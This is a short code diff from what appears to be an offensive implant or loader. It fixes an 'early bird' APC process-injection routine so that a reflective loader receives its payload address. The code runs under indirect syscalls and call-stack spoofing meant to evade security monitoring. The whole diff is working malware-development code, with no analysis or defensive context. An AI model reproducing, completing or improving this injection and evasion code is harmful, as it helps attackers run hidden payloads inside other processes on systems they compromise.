@@ -387,11 +387,14 @@ static BOOL _inject_early_bird(const unsigned char *payload, SIZE_T payloadLen,
 
     result->remoteBase = remoteBase;
 
-    /* Queue APC to the main thread BEFORE it starts */
+    /* Queue APC to the main thread BEFORE it starts.
+     * Pass remoteBase as the APC parameter — the reflective loader
+     * receives it as its first argument and uses it to find the PE
+     * payload via the header at the start of the buffer. */
 #if CONFIG_INDIRECT_SYSCALLS
     NTSTATUS status;
     SPOOF_BEGIN();
-    status = Sw_NtQueueApcThread(pi.hThread, remoteBase, NULL, NULL, NULL);
+    status = Sw_NtQueueApcThread(pi.hThread, remoteBase, remoteBase, NULL, NULL);
     SPOOF_END();
     if (!NT_SUCCESS(status)) {
         _set_error(result, "NtQueueApcThread (early bird) failed", (DWORD)status);
@@ -401,7 +404,7 @@ static BOOL _inject_early_bird(const unsigned char *payload, SIZE_T payloadLen,
         return FALSE;
     }
 #else
-    if (QueueUserAPC((PAPCFUNC)remoteBase, pi.hThread, 0) == 0) {
+    if (QueueUserAPC((PAPCFUNC)remoteBase, pi.hThread, (ULONG_PTR)remoteBase) == 0) {
         _set_error(result, "QueueUserAPC (early bird) failed", GetLastError());
         TerminateProcess(pi.hProcess, 1);
         CloseHandle(pi.hThread);
